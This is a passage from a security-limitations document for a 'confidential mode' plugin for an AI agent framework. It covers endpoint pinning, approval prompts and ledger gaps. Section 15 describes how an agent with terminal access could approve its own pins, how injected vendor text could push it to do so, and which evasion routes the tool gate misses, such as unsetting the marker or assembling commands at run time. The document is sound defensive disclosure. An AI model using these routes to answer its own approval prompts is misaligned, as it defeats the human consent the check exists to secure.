  services that a per-model name list, shipped with the plugin, names for that model. Such a list can
  miss services, so every other service follows. A long list is folded into a count, and the command
  `hermes confidential pins` prints every line.
- A model entry is approved only with its whole service map pinned, together with its privilege tags.
  When a verification stages a NEAR entry, the plugin fetches, in the background, each deployed
  docker-compose file the map names, from the GitHub repository that the measured compose names in
  `GITHUB_REPO` (today `nearai/cvm-compose-files`), at the logged commit. Nothing is fetched when the
  measured compose names no repository on github.com, and such an entry cannot be approved. The plugin
  keeps a file only when its SHA-256 equals the log's `file_sha256`. The approve
  command fetches again before it asks, and so does `hermes confidential pins review`. From those files
  the plugin tags each service's privileges, such as holding `dstack.sock` or running privileged. The
  guide's section "Reviewing a pending pin" (GUIDE.md) lists every tag. Until every file of an entry is kept, the
  entry cannot be approved, and the approve command says so and names `pins review`. A file that is
  kept but does not parse blocks approval of that entry for good, which fails closed. The tags read the compose text only. A
  missing tag is not evidence, and the tags do not show what runs, because what runs after launch is
  not measured (above). Setting `CONFIDENTIAL_MODE_NO_FETCH` turns the fetch off; NEAR model entries
  then cannot be approved.
- A file that hashes to the log's value was published under the repository's URL at that commit.
  GitHub also serves a commit that exists only in a fork under the parent repository's URL, so the
  fetch does not establish that the commit belongs to `nearai/cvm-compose-files` itself. The review
  bundle says so in its question about the publisher.
- The commit author and date in the review bundle come from GitHub's API and are not signed. A
  reviewer can use them as a hint about who published a change, not as proof.
- Vendor strings from the log are shown escaped. A control character or an escape sequence appears as a
  visible backslash escape, and its line is tagged. The ledger, the pins file and the receipt JSON keep
  the raw bytes.
- The plugin reads each CVM's app_id, OS image and KMS key from dstack's boot events in RTMR3. Each event
  must appear once, before the `system-ready` event, with dstack's boot event type. A report that lacks
  one, or repeats one, is refused. Whether a program inside the CVM can add an event with one of those
  names after boot is not established. If such a program adds one, the repeat rule refuses the report.
- The replay's `NOT_ESTABLISHED` list names every item above.

**The change that would close it.** On NEAR's side: one signature chain from the model's bytes through
the gateway to the bytes the client received; a signing key per instance, or the instance id inside
the signed text; TCB status and GPU evidence bound to the model CVM's own quote; each deployment after
launch measured into the TD (for example extended into RTMR3), and the quote socket kept away from the
services it deploys. In the plugin: pinning the model signing key, so that a key change becomes a
pin prompt instead of a refusal until restart.

## 15. An agent with a terminal can reach the approval prompt

**The gap.** A pin, or a tool on the locked allowlist, takes effect only after a person answers a
prompt. The command `hermes confidential pins approve` asks that question on the terminal it runs in.
A chat surface asks it in its own way; in Hermes' interactive CLI that is the clarify panel. Hermes'
`terminal` tool can run a command under a pseudo-terminal, which is a terminal that a program drives,
and `process_manage` can type into it. An agent could therefore run the approve command, or start a nested
`hermes` chat and type `/confidential pins approve` into it, and answer the prompt itself. A pin bundle
handed to an agent for review is vendor text, and vendor text can try to make the agent do exactly
that.

**Why it exists.** Hermes runs `terminal`, `process_manage` and `execute_code` on this host without a
prompt, also while locked (section 3). No prompt can tell a person's keyboard from a pseudo-terminal.
In Hermes 84a0301 a chat client is attached to one gateway process, which runs every session's tools
and also runs the slash commands typed into any attached client. A nested chat that a tool started
attaches to that same gateway, and the gateway cannot tell which client answers a prompt.

**What the plugin does today.** While the profile is locked, the tool gate refuses tool calls that
would run the plugin's command line, import its package or write its state files. Every approval prompt refuses when the
process carries the tool marker. The marker reaches terminal, process_manage and execute_code children.
An agent that unsets the marker, assembles the command at run time, or attaches through the gateway
socket can approve a pin. Such an approval is recorded with approved_via, and the ledger shows it. A
person who runs an agent with terminal access on the same host should treat pins approved during an
agent session as the agent's work unless they remember answering.

**A tool answer reached this way covers more calls by default.** Under the default
`confidential.tools.ask: once_per_lock`, one `once` answer to a tool prompt covers that tool in that
conversation (Hermes' approval session key and the agent's session id) for every later call until
unlock. An answer the agent gave itself, through a nested chat attached to the same gateway, is
therefore wider than one call: the agent's later calls of that tool in that conversation run
without a prompt until unlock. Other conversations, users and subagents still ask. The answer's
`tool_allowed` row records its surface, and each later call's `lock_grant` row names the answering
row in `grant_row`. Set `confidential.tools.ask: each_call` to make every answer cover one call.

The details of the tool gate, the tool marker and the routes that stay open:

- The tool gate reads the arguments of `terminal` calls as shell commands, `execute_code` calls as
  Python, and `process_manage` input as both. Before it splits shell text, it joins a backslash at a
  line end with the next line, and it expands bash's `$'...'` quoting. It scans each `$(...)`,
  backtick, `<(...)` and `>(...)` substitution on its own, and it scans each heredoc body. It then
  splits the text into single commands at `;`, `&&`, `||`, `|`, `&`, parentheses and line ends. The
  gate refuses exactly these forms:
  - a word named `hermes`, by name or by path, or `python -m hermes_cli.main`, `python -m hermes_cli`
    or `python -m runpy hermes_cli.main`, with a later word `confidential` or a word starting with
    `/confidential` in the same command. This covers wrappers and launchers such as `sudo`, `env`,
    `uv run`, `find -exec`, `ssh`, `screen`, `tmux`, `watch` and `parallel`. Text tools such as `echo`
    and `grep` are exempt;
  - `xargs` or `parallel` running `hermes` in a pipeline in which another command prints the word
    `confidential`;
  - a command whose first argument is `confidential` and whose second is one of its verbs (`pins`,
    `allow`, `off`, `on`, `lock`, `unlock`, `setup`, `approve`, `retire`, `status`, `check`,
    `receipts`, `replay`). This covers an alias, a renamed copy of `hermes`, and `$(which hermes)`.
    Text tools and build or package tools such as `make` and `npm` are exempt;
  - a line that types the slash command `/confidential`;
  - Python code that imports `confidential_mode` in code, not in a string or a comment. The gate
    reads such code in `execute_code`, after `python -c`, in a script file `python` runs, in a script
    an earlier command of the same call writes, and in Python fed through a heredoc, a here-string or
    a pipe. `python -m confidential_mode...` is refused too;
  - Python code that imports or runs `hermes_cli` with a `confidential` string, or that starts a process
    with one of the shell forms above;
  - Python code that writes, moves or deletes a file and names a state file or the plugin's data
    directory: an `open` mode with `w`, `a`, `x` or `+`, `write_text`, `unlink`, `shutil`, or a
    `sqlite3` connection not opened with `mode=ro`. Python that only reads a state file passes;
  - code passed to `perl`, `ruby`, `node` and similar interpreters with `-e`, whose strings name
    `hermes` and then `confidential`;
  - any of the forms above inside `bash -c`, `sh -lc`, `eval`, a shell or `at` reading a pipe or a
    heredoc, or a shell script an earlier command of the same call writes;
  - a write to a state file or into the plugin's data directory. That is a redirection or `tee` into
    one; the destination of `cp`, `mv`, `install`, `rsync` or `ln`, including `-t DIR` (a source is a
    read, except for `mv` and `ln`); a `w` file in a `sed` or `awk` script; and any word, or the value
    of a word such as `of=pins.yaml`, of another command that is not read-only. The read-only commands
    are the text tools, `jq`, `yq`, `sqlite3 -readonly`, `sed` and `perl` without `-i`, and the `git`
    subcommands that only read, such as `log`, `diff`, `show` and `status`.

  A state file is `pins.yaml`, `ledger.sqlite` or `allowlist.yaml`, with their lock, journal and backup
  files, or `state.json` inside a `plugin-data` directory. A glob that could match one counts. A path
  counts when it is relative, because the gate does not know the working directory, when it lies inside
  a `plugin-data` directory, or when it lies inside the Hermes home outside this plugin's source tree.
  The plugin's data directory is the `plugin-data` directory entry whose name contains `confidential`,
  or a glob there. The gate also refuses `write_file` and `patch` calls whose target path, or a
  multi-file patch's file, is a state file or lies in the plugin's data directory. Each refusal writes a
  `tool_refused` row with the decision `self_approval`.
- The gate lets through the calls in its test list that only mention the command, the package or a
  file. Examples are `grep "confidential off" README.md`, `echo 'mark confidential on purpose'`,
  `awk '/confidential on/' notes.txt`, `make confidential status`, `git diff confidential_mode/`,
  `git commit -m` with any message, `cat`, `jq` or `cp` of the pins file to elsewhere,
  `print('import confidential_mode')` in Python, and `write_file` or `patch` on this plugin's own
  source. A test run such as `pytest` imports the package without naming it, so the gate does not see
  that import. A literal match can still refuse an unusual harmless call, for example a non-text
  command whose argument is the bare file name `pins.yaml`.
- The gate cannot see a command assembled at run time, for example from a variable, base64, brace
  expansion or a computed `eval`. It cannot see a script that imports the package indirectly, a script
  or file written by an earlier call, or a symlink or directory made by an earlier call. It cannot see a
  command split across several `process_manage` writes.
- The tool marker is the environment variable `XDG_CONFIDENTIAL_MODE_TOOL_PROCESS`. The plugin's tool
  hooks set it, once, to the id of the Hermes process, before any tool runs. The `XDG_` prefix is one
  Hermes passes into execute_code's restricted environment. A prompt in the process that set the
  marker (the person's own surface there) is asked. A refused prompt writes a `pin_denied` or
  `tool_refused` row with the decision `self_approval`.
- In Hermes 84a0301 a chat client attached to the gateway has its slash commands run by the gateway
  process itself, which carries its own marker, so a nested chat that a tool started can
  answer through the gateway.
- An agent in another profile that does not load this plugin has no marker, and this profile's tool
  gate does not see its calls. It can run the approve command for this profile under a
  pseudo-terminal and answer it.
- Any process running as your user can write `pins.yaml` and a matching `pin_applied` row into the
  ledger file, so a forged approval passes the consent check (GUIDE.md, "Why a pin needs a consent record").

**The change that would close it.** A consent surface that an agent cannot drive, for example an
approval that Hermes core asks on a channel it never exposes to tools, plus a marker Hermes sets on
every tool subprocess and that a plugin can read but a command cannot remove. A gateway that tells a
plugin which client answered, and whether a tool started that client, would close the nested-chat
route. A typed challenge shown only on the approving surface would also work.

## 16. Hermes titles the plugin's approval prompt "Dangerous Command"

**The gap.** When an off-host tool asks, Hermes shows its own approval panel. The panel's title is
"Dangerous Command". A web search is not a dangerous command, so the title misleads.

**Why it exists.** A plugin asks through Hermes' approval gate, `tools.approval.request_tool_approval`.
Hermes draws every request from that gate with the same panel and the same title as a risky shell
command. The line under the title is `<name> (plugin approval rule)`, built at
`tools/approval.py:1227`. A plugin rule cannot set the title, and a `pre_tool_call` approve directive
cannot set the line under the title.

**What the plugin does today.** The plugin's own text leads with what is happening:
"Confidential mode: web_search wants to send ~1 KB of this conversation off the machine". The size
counts the call's arguments and any local image file the call names. The size is shown in MB above 1 MB.
When the plugin asks from its tool-execution middleware, which is the path the interactive CLI and the
gateway take, it gives Hermes the name "confidential mode: off-host tool web_search". The line under
the title then reads `<confidential mode: off-host tool web_search> (plugin approval rule)`. When
Hermes asks for the plugin's `pre_tool_call` directive instead, that line names the tool alone. The
title itself always reads "Dangerous Command".

**The change that would close it.** A `title` and a `target` field on the approve directive and on
`request_tool_approval`, shown in place of Hermes' defaults.

## Smaller gaps, disclosed

Each item below states a smaller gap in full.

- **Persistence-disabled agents skip `pre_llm_call`.** Hermes skips `pre_llm_call` for agents with
  persistence disabled (`agent/turn_context.py:858`), such as the background review agent. The
  plugin's middleware runs the same per-turn check for their main calls (the preflight recheck, the
  breach rows and the live-runtime check). An auxiliary call such an agent makes before its first main
  call on a drifted runtime is recorded, not refused, and the agent gets no locked note.

- **A timing window around yolo.** If yolo mode is switched on or off between the hook's thread and the
  agent's thread, there is a short window in which the two disagree.

- **The lock is profile-wide.** Concurrent gateway sessions on one profile share the same lock.

- **Group chats and untested surfaces.** In a group chat, `ctx.ask_choice` may accept an answer from
  any authorised member. The consent prompt is not tested on Desktop, the Ink TUI or shared-runtime
  routing.

- **Delegation and cron config.** The hook cannot see the delegation backend that an agent has pinned.
  The preflight does not enumerate `cron.model_provider`. Cron jobs are blocked while locked instead.

- **Voice paths.** The plugin does not examine the voice-chat and gateway voice-note TTS paths. The preflight's
  "disabled" verdict for `tts.provider` holds only while `voice.auto_tts` is false and the
  `text_to_speech` tool asks before it runs (once per lock and conversation by default; set
  `confidential.tools.ask: each_call` to have it ask on every call).

- **A `once` answer covers the tool for the rest of the lock, in that conversation and that
  process.** Under the default `confidential.tools.ask: once_per_lock`, the grant belongs to the
  conversation that answered (Hermes' approval session key and the agent's session id), so another
  chat, user or subagent asks again. The grant lives in the memory of the process that asked: a
  gateway restart asks again, and a second process holding the same lock (a CLI next to a gateway)
  asks on its own. Later calls are not shown to you; each has a `tool_allowed` row naming
  the answer that granted it.

- **A vendor key held only in Hermes' credential pool refuses the lock.** The plugin reads
  `TINFOIL_API_KEY` and `NEAR_AI_API_KEY` only through Hermes' secret scope
  (`agent.secret_scope.get_secret`, which sees the environment Hermes loaded from your shell and
  `<hermes home>/.env`), or from `model.api_key`, and opens no credential store (catalog rule 11). A key added only with `hermes auth add` reads as not
  set, so the lock and `check` refuse with the key row, although Hermes itself would find the key for
  the provider. Export the key or put it in `<hermes home>/.env`. Closing this gap needs a Hermes
  call that reports whether a pooled credential exists without reading it.

- **`tts.enabled` is a plugin convention.** Hermes 84a0301 has no such key.

- **Remembered `always` grants outlive the lock.** Hermes stores them in `command_allowlist` as
  `plugin_rule:confidential-mode:tool:<name>`. They survive an unlock. `/confidential pins` lists them.
  `/confidential revoke <tool>` (or `hermes confidential revoke <tool>`) removes the grant, and
  `revoke --all` removes every grant the plugin holds. A revoke does not edit Hermes' session
  approvals: the plugin asks under a new approval key from then on, so a session approval for the old
  key stops applying. Deleting `grants_revoked.json` does not bring the old key back in a running
  process; after a restart with the file deleted, the old key is used again, and only a `command_allowlist`
  entry the revoke could not remove would then apply. An approval prompt already open in the
  gateway can still be answered after a revoke, and that answer grants the tool again. A tool call
  already past the gate finishes. A revoke that finds nothing to remove records nothing when the ledger
  shows no prompt for the tool since the last revoke that moved the key; a prompt shown before such a
  revoke and answered `once` after it, whose answer row then fails to write, leaves a lock grant in the
  asking process that a later revoke of this kind does not end, until unlock. That check reads the
  ledger, while the approval key comes from `grants_revoked.json`: with that file deleted or reset, a
  process that starts afterwards asks under the original key, so a session approval under the original
  key held by another process applies again, and a later revoke that finds no prompt in the ledger
  records nothing and does not move the key.

- **`/confidential allow` additions last for one lock only.** The plugin stores additions in
  `allowlist.yaml`, tagged with the lock's identity. A new lock starts with none. A file tagged with
  another lock's identity adds nothing. `/confidential off` deletes the file. The file has mode 0600.
  Anyone who can edit it can add a tool for the current lock without a prompt or a ledger row. Such
  an edit is inside the stated trust boundary (section 6).

- **Older ledger rows keep raw approval answers.** This version stores a classification of each
  approval answer instead of the text. Rows written by an earlier version are not rewritten, so a
  receipt that covers them can still show the answer as typed.

- **Mixed plugin versions disagree about the lock.** The lock records a fingerprint of the routing
  config, and this version added the terminal backend and a non-empty
  `confidential.on_host.extra_hosts` list to it. A lock made by an earlier version still matches,
  except a lock made with a non-empty `extra_hosts` list, and an on-host lock whose model sits at a
  private-range address must now list that address; both need a fresh lock. A process that still runs the earlier version, however, reads a lock made by this version
  as a changed config. That process refuses every turn and marks the session breached. Restart every Hermes
  process that loads the plugin after an upgrade (GUIDE.md, "Upgrading").

- **The ledger grows without limit.** The plugin never deletes ledger rows. On the attested tier a
  `verify_ok` row with its evidence is written about every `confidential.verify_ttl_seconds` minus
  `confidential.verify_refresh_lead_seconds` (four minutes by default) while sends continue. Each such row is about 15 KB for Tinfoil. For NEAR it is about 20 KB in the row plus about 120 KB
  of evidence files in `evidence/blobs/` beside the ledger, for one model. An evidence file stays
  while any row names it. Those verification rows and their evidence files add a few megabytes to tens of megabytes
  a day. A receipt reads the ledger from the last unlock before its session. A profile
  that has never been unlocked therefore still reads from the start of the ledger, and rendering
  slows as the file grows. To start a new
  ledger, unlock, render the receipts you want to keep, stop Hermes, and move `ledger.sqlite` aside.
  Hermes creates a new file at the next start.

- **Pins need a consent record.** The attested check refuses a pin that has no matching `pin_applied`
  row in the ledger, with the message "pin has no consent record". Any process running as your user,
  not only code in the same process, can write such a row into the ledger file.

- **A ledger that cannot be written blocks attested sends.** A verification whose `verify_ok` row
  cannot be written is refused, so that no send rests on a verification the ledger does not hold. A
  transient "database is locked" error is retried once. Any other write failure, such as a full disk,
  a corrupt file or a row over the size cap, blocks attested sends for Tinfoil and NEAR until a later
  verification writes its row. The plugin tries again after a 10-second backoff.

- **Long caller strings are clipped in the ledger.** A tool name, compaction reason, error text or other
  free text that Hermes or the model supplies is cut to 1024 characters in the ledger row, with a note of
  its full length and a digest. Session ids, tool call ids, fingerprints and reason codes are kept whole. A
  row whose detail is still over the 256 KB cap keeps only its short fields and is marked "detail too large:
  <n> bytes, truncated". The receipt shows such a row as "detail lost" and never counts it as covered. A
  marked pin row never grants consent, and a marked retire still withdraws it. The refusal itself uses the
  full name; only the record is shortened.

- **Lock files keep processes apart, except on Windows.** A lock, an unlock, an allow, a revoke and a pin
  change each take a lock file next to the file they change. A second lock or unlock that starts while
  another is in progress waits at most 2 seconds and is then refused. A lock file that cannot be opened or
  locked, for example in a read-only data directory or on a network filesystem that refuses the lock, also
  refuses the change, and the reply says why. On Windows, which has no `fcntl` module, only a lock inside
  one process is taken, so two Hermes processes on Windows are not kept apart.

- **NEAR model entries need GitHub.** A NEAR model entry can be approved only with its service map
  pinned, and that needs the deployed docker-compose files from GitHub (section 14). While GitHub is
  unreachable, or with `CONFIDENTIAL_MODE_NO_FETCH` set, such an entry cannot be approved.

- **The offline replay's identity checks have limits.** `hermes confidential replay` requires the
  repository `tinfoilsh/confidential-model-router` by default. It takes the expected fingerprints from
  your approved pin, or from a flag. Two inputs still come from the evidence unless you supply them.
  The first is the trust root, which you can replace with `--trusted-root`. The second is the time
  certificates are checked at, which you can replace with `--as-of`. The numeric GitHub repository and
  owner IDs are checked only when you pass `--expected-repo-id` and `--expected-owner-id`; without
  them the replay identifies the repository by name alone and the `repo_identity` check says `name only (ids not supplied)`.

  When you call the Python function `replay()` without `expected_fingerprints`, it compares the
  fingerprints only with those recorded in the evidence. Compare the result's fingerprints with your
  pin yourself.

- **A listed on-host host is trusted, not checked.** A host in `confidential.on_host.extra_hosts`
  counts as on-host because the list says so. The plugin cannot check that the host is a machine you
  control. A private-range, carrier-grade NAT, link-local or unique-local address can belong to
  another machine, so such an address is off-tier unless listed. A listed DNS name is resolved by the
  HTTP client at every send, so whoever answers DNS for that name picks the destination.

- **A locked session has no fallback.** While locked, any provider error on a main call ends the turn
  with "attested endpoint unavailable; this turn ended; resend", and a verification that does not
  finish within `confidential.verify_wait_seconds` (20 by default) ends the turn too. Nothing is
  retried or rerouted. [COSTS.md](COSTS.md) states the effect on task success.

- **A lock from a terminal records only the tools a terminal process registers.** A tool that only
  the gateway connects, such as an MCP tool, is not in a lock made with `hermes confidential on`, and
  is blocked as unregistered. A lock made from chat records such tools.

- **The `zero-retention` tier is not implemented.** `/confidential on zero-retention` refuses. A
  hosted provider's promise not to keep data is a policy, and nothing the plugin can observe from this
  host confirms it.

- **The first pin is trust on first use.** The pin prompt shows the full fingerprints. It says whether
  the code changed or only the platform changed. For a first pin, it says there is nothing to compare
  against. Nothing in the prompt tells you whether a build is any good.
